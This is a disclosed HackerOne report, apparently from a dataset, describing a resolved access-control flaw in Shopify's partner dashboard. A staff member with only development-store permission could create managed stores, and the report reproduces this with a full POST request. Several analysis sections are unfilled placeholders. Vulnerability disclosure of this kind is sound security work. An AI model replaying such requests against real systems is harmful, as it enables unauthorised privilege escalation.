---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1167753'
original_report_id: '1167753'
title: Add new managed stores without permission
weakness: Improper Access Control - Generic
team_handle: shopify
created_at: '2021-04-18T12:23:49.687Z'
disclosed_at: '2021-07-08T18:25:09.605Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 28
asset_identifier: partners.shopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Add new managed stores without permission

## Metadata

- HackerOne Report ID: 1167753
- Weakness: Improper Access Control - Generic
- Program: shopify
- Disclosed At: 2021-07-08T18:25:09.605Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Details
A staff member who has permission to add, archive and unarchive development stores as shown in managedStoreA.png  can also add new managed stores. I can't tell if the issue I pointed out in #1167453 has the same root cause as this. A staff member with the said permission can access /organizationID/stores/create_managed_store endpoint as seen in managedStoreB.png. The POST request below can be used to reproduce the described issue.

```
POST /100808/stores/create_managed_store HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://partners.shopify.com/100808/stores/new?store_type=managed_store
Content-Type: application/json
X-Requested-With: XMLHttpRequest
X-CSRF-Token: ...

{"message":"","permissions":["applications","customers","dashboard","domains","draft_orders","edit_orders","gift_cards","links","locations","marketing","marketing_section","orders","overviews","pages","products","reports","themes","preferences","view_shopify_payments_payouts","view_billing_details","view_private_apps","edit_private_apps"],"store_domain":"myStore1","collaborator_access_code":""}

```

## Impact

Staff member can perform action that requires permission

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
